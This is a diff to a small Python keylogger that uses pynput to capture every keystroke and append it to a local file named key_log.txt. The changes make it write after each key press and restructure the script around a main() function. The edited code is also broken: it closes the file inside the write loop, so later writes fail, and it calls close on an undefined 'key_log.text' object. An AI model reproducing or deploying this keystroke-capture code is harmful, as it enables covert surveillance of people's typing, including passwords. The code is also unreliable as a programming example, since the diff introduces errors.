@@ -1,8 +1,7 @@
+from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
-
-from pynput.keyboard import Key, Listener
 
 def key_press(key):
     global keys, count
@@ -11,12 +10,8 @@ def key_press(key):
     count += 1
     print("{0} pressed".format(key))
 
-    if count >= 5:
-        count = 0
-        write_file(keys)
-        keys = []
-
-   
+    write_file(keys)
+    keys = []
 
 def write_file(keys):
     with open("key_log.txt", "a") as f:
@@ -24,14 +19,20 @@ def write_file(keys):
             k = str(key).replace("'"," ")
             if k.find("space") > 0:
                 f.write(str('\n'))
+                f.close()
             elif k.find("key") == -1:
                 f.write(k)
+                f.close()
 
 
 def key_release(key):
     if key == Key.esc:
+        key_log.text.close()
         return False
 
-with Listener(key_press=key_press, key_release=key_release) as listener:
-    listener.join()
-    
+def main():
+    with Listener(on_press=key_press, on_release=key_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()      
